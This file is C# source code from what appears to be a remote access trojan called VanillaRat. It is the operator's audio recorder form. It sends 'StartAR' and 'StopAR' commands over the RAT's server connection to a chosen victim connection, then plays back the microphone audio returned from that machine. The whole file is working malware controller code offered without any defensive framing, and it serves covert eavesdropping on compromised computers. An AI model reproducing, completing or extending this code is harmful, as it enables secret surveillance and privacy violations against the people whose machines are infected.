using System;
using System.IO;
using System.Media;
using System.Text;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class AudioRecorder : Form
    {
        private bool Playing;
        private bool Recording;
        private SoundPlayer SP = new SoundPlayer();

        public AudioRecorder()
        {
            InitializeComponent();
            btnPlayback.Enabled = false;
            MinimizeBox = false;
            MaximizeBox = false;
            Update = true;
        }

        public int ConnectionID { get; set; }
        public bool Update { get; set; }
        public byte[] BytesToPlay { get; set; }

        //Start or stop audio recording
        private void btnStartStopRecord_Click(object sender, EventArgs e)
        {
            if (!Recording)
            {
                Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StartAR"));
                btnStartStopRecord.Text = "Stop Recording";
                Recording = true;
                btnPlayback.Enabled = false;
            }
            else
            {
                Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopAR"));
                btnStartStopRecord.Text = "Start Recording";
                Recording = false;
                btnPlayback.Enabled = true;
            }
        }

        //Start or stop audio playback
        private void btnPlayback_Click(object sender, EventArgs e)
        {
            if (BytesToPlay == null)
            {
                MessageBox.Show("Error: No audio to play. Recorded audio may not have sent yet.", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (!Playing)
                try
                {
                    using (MemoryStream MS = new MemoryStream(BytesToPlay))
                    {
                        SP = new SoundPlayer(MS);
                        SP.Play();
                    }

                    btnPlayback.Text = "Stop Playing";
                    Playing = true;
                }
                catch { }
            else
                try
                {
                    SP.Stop();
                    Playing = false;
                    btnPlayback.Text = "Start Playing";
                }
                catch { }
        }

        //On form close
        private void AudioRecorder_FormClosing(object sender, FormClosingEventArgs e)
        {
            Update = false;
        }
    }
}